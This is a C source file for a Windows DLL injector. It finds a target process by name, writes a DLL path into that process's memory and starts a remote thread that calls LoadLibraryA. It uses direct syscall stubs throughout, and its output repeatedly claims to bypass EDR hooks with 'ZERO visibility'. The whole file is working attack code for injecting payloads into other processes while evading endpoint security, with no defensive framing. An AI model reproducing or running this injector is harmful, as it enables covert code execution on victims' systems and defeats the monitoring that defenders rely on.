#include "syscalls.h"
#include <tlhelp32.h>
#include <stdio.h>

// Find process by name
DWORD FindProcessId(const char* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed: %lu\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("[-] Process32First failed: %lu\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

// DLL Injection usando SOLO syscalls directos
BOOL InjectDLL_Syscalls(DWORD processId, const char* dllPath) {
    NTSTATUS status;
    HANDLE hProcess = NULL;
    PVOID remoteMemory = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;

    printf("[*] Target Process ID: %lu\n", processId);
    printf("[*] DLL to inject: %s\n", dllPath);

    // Get full path
    char fullDllPath[MAX_PATH];
    if (!GetFullPathNameA(dllPath, MAX_PATH, fullDllPath, NULL)) {
        printf("[-] GetFullPathName failed: %lu\n", GetLastError());
        return FALSE;
    }

    SIZE_T dllPathLen = strlen(fullDllPath) + 1;
    printf("[+] Full DLL path: %s (%llu bytes)\n", fullDllPath, (unsigned long long)dllPathLen);

    // === PASO 1: Abrir proceso con SYSCALL ===
    printf("\n[*] STEP 1: Opening process with NtOpenProcess syscall...\n");

    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES objAttr;

    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)processId;
    clientId.UniqueThread = NULL;

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    status = SysNtOpenProcess(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &objAttr,
        &clientId
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenProcess failed: 0x%08X\n", status);
        printf("[-] Try running as Administrator\n");
        return FALSE;
    }

    printf("[+] Process opened via syscall! Handle: %p\n", hProcess);
    printf("[+] EDR hooks bypassed on OpenProcess\n");

    // === PASO 2: Asignar memoria con SYSCALL ===
    printf("\n[*] STEP 2: Allocating memory with NtAllocateVirtualMemory syscall...\n");

    remoteMemory = NULL;
    SIZE_T regionSize = dllPathLen;

    status = SysNtAllocateVirtualMemory(
        hProcess,
        &remoteMemory,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtAllocateVirtualMemory failed: 0x%08X\n", status);
        SysNtClose(hProcess);
        return FALSE;
    }

    printf("[+] Memory allocated via syscall: %p\n", remoteMemory);
    printf("[+] Size: %llu bytes\n", (unsigned long long)regionSize);
    printf("[+] EDR hooks bypassed on VirtualAllocEx\n");

    // === PASO 3: Escribir DLL path con SYSCALL ===
    printf("\n[*] STEP 3: Writing DLL path with NtWriteVirtualMemory syscall...\n");

    SIZE_T bytesWritten = 0;

    status = SysNtWriteVirtualMemory(
        hProcess,
        remoteMemory,
        (PVOID)fullDllPath,
        dllPathLen,
        &bytesWritten
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtWriteVirtualMemory failed: 0x%08X\n", status);

        // Free memory
        SIZE_T freeSize = 0;
        SysNtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &freeSize, MEM_RELEASE, 0);
        SysNtClose(hProcess);
        return FALSE;
    }

    printf("[+] DLL path written via syscall: %llu bytes\n", (unsigned long long)bytesWritten);
    printf("[+] EDR hooks bypassed on WriteProcessMemory\n");

    // === PASO 4: Obtener dirección de LoadLibraryA ===
    printf("\n[*] STEP 4: Getting LoadLibraryA address...\n");

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        printf("[-] GetModuleHandle failed: %lu\n", GetLastError());

        SIZE_T freeSize = 0;
        SysNtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &freeSize, MEM_RELEASE, 0);
        SysNtClose(hProcess);
        return FALSE;
    }

    PVOID pLoadLibrary = (PVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibrary == NULL) {
        printf("[-] GetProcAddress failed: %lu\n", GetLastError());

        SIZE_T freeSize = 0;
        SysNtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &freeSize, MEM_RELEASE, 0);
        SysNtClose(hProcess);
        return FALSE;
    }

    printf("[+] LoadLibraryA address: %p\n", pLoadLibrary);

    // === PASO 5: Crear thread remoto con SYSCALL ===
    printf("\n[*] STEP 5: Creating remote thread with NtCreateThreadEx syscall...\n");

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    status = SysNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        &objAttr,
        hProcess,
        pLoadLibrary,        // Start address (LoadLibraryA)
        remoteMemory,        // Argument (DLL path)
        0,                   // CreateFlags (0 = run immediately)
        0,                   // ZeroBits
        0,                   // StackSize (0 = default)
        0,                   // MaximumStackSize
        NULL                 // AttributeList
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateThreadEx failed: 0x%08X\n", status);

        SIZE_T freeSize = 0;
        SysNtAllocateVirtualMemory(hProcess, &remoteMemory, 0, &freeSize, MEM_RELEASE, 0);
        SysNtClose(hProcess);
        return FALSE;
    }

    printf("[+] Thread created via syscall! Handle: %p\n", hThread);
    printf("[+] EDR hooks bypassed on CreateRemoteThread\n");

    // === PASO 6: Esperar a que termine con SYSCALL ===
    printf("\n[*] STEP 6: Waiting for thread with NtWaitForSingleObject syscall...\n");

    LARGE_INTEGER timeout;
    timeout.QuadPart = -50000000LL;  // 5 seconds (negative = relative time)

    status = SysNtWaitForSingleObject(
        hThread,
        FALSE,
        &timeout
    );

    if (status == 0x00000102) {  // STATUS_TIMEOUT
        printf("[!] Thread timeout (DLL might be loading slowly)\n");
    }
    else if (!NT_SUCCESS(status)) {
        printf("[-] NtWaitForSingleObject failed: 0x%08X\n", status);
    }
    else {
        printf("[+] Thread completed successfully\n");
    }

    // Get thread exit code (module handle if successful)
    // Note: We'd need NtQueryInformationThread for this, keeping it simple

    printf("[+] DLL injection complete!\n");
    success = TRUE;

    // === CLEANUP con SYSCALLS ===
    printf("\n[*] Cleanup with syscalls...\n");

    if (hThread) {
        SysNtClose(hThread);
        printf("[+] Thread handle closed\n");
    }

    // Note: We don't free the DLL path memory because LoadLibrary needs it
    // It will be freed by the OS when the process exits

    if (hProcess) {
        SysNtClose(hProcess);
        printf("[+] Process handle closed\n");
    }

    return success;
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("  DLL Injector with Direct Syscalls\n");
    printf("  BYPASSES EDR HOOKS COMPLETELY\n");
    printf("========================================\n\n");

    if (argc < 3) {
        printf("Usage: %s <process_name> <dll_path>\n", argv[0]);
        printf("\nExamples:\n");
        printf("  %s notepad.exe payload.dll\n", argv[0]);
        printf("\nNote: This uses DIRECT SYSCALLS to bypass EDR\n");
        return 1;
    }

    const char* processName = argv[1];
    const char* dllPath = argv[2];

    // Initialize syscall stubs
    printf("[*] Initializing direct syscalls...\n");
    if (!InitializeSyscalls()) {
        printf("[-] Failed to initialize syscalls!\n");
        return 1;
    }
    printf("[+] Syscalls initialized\n");
    printf("[+] All operations will bypass EDR hooks\n\n");

    // Find target process
    printf("[*] Searching for process: %s\n", processName);
    DWORD pid = FindProcessId(processName);

    if (pid == 0) {
        printf("[-] Process not found: %s\n", processName);
        return 1;
    }

    printf("[+] Found process: %s (PID: %lu)\n", processName, pid);

    // Check if DLL exists
    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL file not found: %s\n", dllPath);
        return 1;
    }

    // Perform injection with syscalls
    printf("\n========================================\n");
    printf("  Starting Injection (ALL SYSCALLS)\n");
    printf("========================================\n");

    if (InjectDLL_Syscalls(pid, dllPath)) {
        printf("\n========================================\n");
        printf("  ✓ INJECTION SUCCESSFUL\n");
        printf("========================================\n\n");

        printf("[!] What happened:\n");
        printf("    • NtOpenProcess - BYPASSED EDR\n");
        printf("    • NtAllocateVirtualMemory - BYPASSED EDR\n");
        printf("    • NtWriteVirtualMemory - BYPASSED EDR\n");
        printf("    • NtCreateThreadEx - BYPASSED EDR\n");
        printf("    • NtWaitForSingleObject - BYPASSED EDR\n");
        printf("    • NtClose - BYPASSED EDR\n\n");

        printf("[!] Your DLL is now running in the target process!\n");
        printf("[!] EDR had ZERO visibility into these operations.\n");

        return 0;
    }
    else {
        printf("\n========================================\n");
        printf("  ✗ INJECTION FAILED\n");
        printf("========================================\n");
        return 1;
    }
}